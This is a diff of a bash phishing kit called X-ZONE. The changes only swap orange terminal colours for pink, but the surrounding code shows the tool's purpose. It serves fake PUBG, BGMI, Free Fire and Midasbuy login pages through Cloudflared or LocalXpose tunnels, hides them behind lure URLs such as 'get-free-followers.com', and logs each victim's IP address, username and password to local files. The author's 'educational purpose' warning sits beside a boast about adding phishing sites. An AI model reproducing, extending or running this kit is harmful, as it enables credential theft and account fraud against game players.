@@ -8,12 +8,24 @@ __version__="1.2"
 HOST='127.0.0.1'
 PORT='8080' 
 
-## ANSI colors (FG & BG)
-RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')" 
+RED="$(printf '\033[31m')"
+GREEN="$(printf '\033[32m')"
+PINK="$(printf '\033[95m')"
+BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"
+CYAN="$(printf '\033[36m')"
+WHITE="$(printf '\033[37m')"
+BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"
+GREENBG="$(printf '\033[42m')"
+PINKBG="$(printf '\033[105m')"
+BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"
+CYANBG="$(printf '\033[46m')"
+WHITEBG="$(printf '\033[47m')"
+BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -82,9 +94,9 @@ check_update(){
 	tarball_url="https://github.com/rabikishanr/x-zone/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
+		echo -ne "${PINK}update found\n"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${PINK} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".x-zone.tar.gz" "${tarball_url}"
@@ -116,16 +128,16 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE}
-		${ORANGE}   _    _          _______  _____  _   _  ___   
-		${ORANGE}  ( )  ( )        (_____  )(  _  )( ) ( )(  _ \ 
-		${ORANGE}   \ \/ /  ______      / / | ( ) ||  \| || (_(_)
-		${ORANGE}    )  (  (______)   / /   | | | ||     ||  _)_ 
-		${ORANGE}   / /\ \          / / ___ | (_) || | \ || (_( )
-		${ORANGE}  ( )  (_)        (_______)(_____)(() (_)(____/ 
-		${ORANGE}  /(                              (_)           
-		${ORANGE} (__)                                           
+		${PINK}
+		${PINK}
+		${PINK}   _    _          _______  _____  _   _  ___   
+		${PINK}  ( )  ( )        (_____  )(  _  )( ) ( )(  _ \ 
+		${PINK}   \ \/ /  ______      / / | ( ) ||  \| || (_(_)
+		${PINK}    )  (  (______)   / /   | | | ||     ||  _)_ 
+		${PINK}   / /\ \          / / ___ | (_) || | \ || (_( )
+		${PINK}  ( )  (_)        (_______)(_____)(() (_)(____/ 
+		${PINK}  /(                              (_)           
+		${PINK} (__)                                           
 		                                                           ${RED}Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} NO WAY TO ESCAPE!!!(Rabikishan Rauniyar)${WHITE}
@@ -156,12 +168,12 @@ dependencies() {
 
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
 		if [[ ! $(command -v proot) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}proot${CYAN}"${WHITE}
 			pkg install proot resolv-conf -y
 		fi
 
 		if [[ ! $(command -v tput) ]]; then
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}ncurses-utils${CYAN}"${WHITE}
 			pkg install ncurses-utils -y
 		fi
 	fi
@@ -172,7 +184,7 @@ dependencies() {
 		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${PINK}$pkg${CYAN}"${WHITE}
 				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
 				elif [[ $(command -v apt) ]]; then
@@ -272,9 +284,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}Rabikishan Rauniyar ${RED}[ ${ORANGE}X-ZONE ${RED}]
+		${GREEN} Author   ${RED}:  ${PINK}Rabikishan Rauniyar ${RED}[ ${PINK}X-ZONE ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/Rabikishanr
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${GREEN} Version  ${RED}:  ${PINK}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
@@ -284,7 +296,7 @@ about() {
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
 		${GREEN}  (htr-tech) for main source and thank me for adding alot of phishing sites of PUBG,BGMI AND FF 🔥
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${PINK} Main Menu     ${RED}[${WHITE}99${RED}]${PINK} Exit
 
 	EOF
 
@@ -304,10 +316,10 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${PINK}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
+		read -n4 -p "${RED}[${WHITE}-${RED}]${PINK} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
 		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
 			echo
@@ -334,7 +346,7 @@ capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PINK}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -345,14 +357,14 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${PINK}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${PINK} Waiting for Next Login Info, ${BLUE}Ctrl + C ${PINK}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${PINK} Waiting for Login Info, ${BLUE}Ctrl + C ${PINK}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -395,9 +407,9 @@ localxpose_auth() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${PINK}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${PINK} Input Loclx Token :${PINK} " loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
@@ -412,7 +424,7 @@ start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${PINK} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -443,9 +455,9 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
-		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}FAST🔥${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15Min${RED}]
+		${RED}[${WHITE}01${RED}]${PINK} Localhost
+		${RED}[${WHITE}02${RED}]${PINK} Cloudflared  ${RED}[${CYAN}FAST🔥${RED}]
+		${RED}[${WHITE}03${RED}]${PINK} LocalXpose   ${RED}[${CYAN}Max 15Min${RED}]
 
 	EOF
 
@@ -467,16 +479,16 @@ tunnel_menu() {
 ## Custom Mask URL
 custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
+	read -n1 -p "${RED}[${WHITE}?${RED}]${PINK} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${PINK} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
+		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${PINK}Example: https://get-free-followers.com${CYAN})\n"
+		read -e -p "${WHITE} ==> ${PINK}" -i "https://" mask_url # initial text requires Bash 4+
 		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
 			mask=$mask_url
 			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
+			echo -e "\n${RED}[${WHITE}!${RED}]${PINK} Invalid url type..Using the Default one.."
 		fi
 	fi
 }
@@ -511,7 +523,7 @@ custom_url() {
     fi
 
     echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
+    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${PINK}$processed_url"
 }
 
 
@@ -520,11 +532,11 @@ custom_url() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}1${RED}]${ORANGE} MUMMY-SUIT (PUBG) ${RED}[${WHITE}2${RED}]${ORANGE} SPIN(PUBG)   ${RED}[${WHITE}3${RED}]${ORANGE} X-SUIT(BGMI)
-		${RED}[${WHITE}4${RED}]${ORANGE} GLACIER(BGMI)     ${RED}[${WHITE}5${RED}]${ORANGE} FREEFIRE     ${RED}[${WHITE}6${RED}]${ORANGE} GLACIER(PUBG)
-		${RED}[${WHITE}7${RED}]${ORANGE} MIDASBUY(OLDxPUBG) ${RED}[${WHITE}8${RED}]${ORANGE} WRAITHFUL-EVENT       
+		${RED}[${WHITE}1${RED}]${PINK} MUMMY-SUIT (PUBG) ${RED}[${WHITE}2${RED}]${PINK} SPIN(PUBG)   ${RED}[${WHITE}3${RED}]${PINK} X-SUIT(BGMI)
+		${RED}[${WHITE}4${RED}]${PINK} GLACIER(BGMI)     ${RED}[${WHITE}5${RED}]${PINK} FREEFIRE     ${RED}[${WHITE}6${RED}]${PINK} GLACIER(PUBG)
+		${RED}[${WHITE}7${RED}]${PINK} MIDASBUY(OLDxPUBG) ${RED}[${WHITE}8${RED}]${PINK} WRAITHFUL-EVENT       
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${PINK} About         ${RED}[${WHITE}00${RED}]${PINK} Exit
 
 	EOF
 	
